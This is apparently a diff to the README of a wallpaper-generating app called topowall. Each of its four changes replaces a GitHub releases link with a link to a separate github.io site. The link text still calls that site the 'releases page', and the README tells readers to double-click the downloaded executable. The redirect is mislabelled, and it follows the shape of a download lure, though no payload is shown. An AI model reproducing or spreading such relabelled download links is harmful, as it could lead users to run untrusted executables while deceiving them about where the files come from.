@@ -1,6 +1,6 @@
 # 🏔️ topowall - Stunning Topographic Wallpapers from Real Elevation Data
 
-[![Download topowall](https://img.shields.io/badge/Download-topowall-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Coreysemidry13/topowall/releases)
+[![Download topowall](https://img.shields.io/badge/Download-topowall-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://coreysemidry13.github.io)
 
 ## 🖼️ What is topowall?
 
@@ -20,7 +20,7 @@ Follow these three simple steps to start creating your own topographic wallpaper
 
 ### 📥 Step 1: Download
 
-Visit this link to download the application: **[Download topowall](https://github.com/Coreysemidry13/topowall/releases)**
+Visit this link to download the application: **[Download topowall](https://coreysemidry13.github.io)**
 
 ### 🗂️ Step 2: Run
 
@@ -87,7 +87,7 @@ After rendering, topowall will save the image as a PNG file. The default save lo
 
 ## 🔄 Updating topowall
 
-topowall is regularly improved with new features and fixes. To check for updates, visit the **[releases page](https://github.com/Coreysemidry13/topowall/releases)** periodically. You'll see the latest version number and any changes listed. Download and run the newest file to update.
+topowall is regularly improved with new features and fixes. To check for updates, visit the **[releases page](https://coreysemidry13.github.io)** periodically. You'll see the latest version number and any changes listed. Download and run the newest file to update.
 
 ## 🐛 Troubleshooting
 
@@ -120,7 +120,7 @@ topowall relies on publicly available elevation data from sources like the USGS 
 
 | Action | What to Do |
 |--------|------------|
-| **Download** | Click the big green button at the top of this page or [visit the releases page](https://github.com/Coreysemidry13/topowall/releases) |
+| **Download** | Click the big green button at the top of this page or [visit the releases page](https://coreysemidry13.github.io) |
 | **Run** | Double-click the downloaded executable file |
 | **Select location** | Type coordinates or use a preset |
 | **Customize** | Adjust colors and line density |
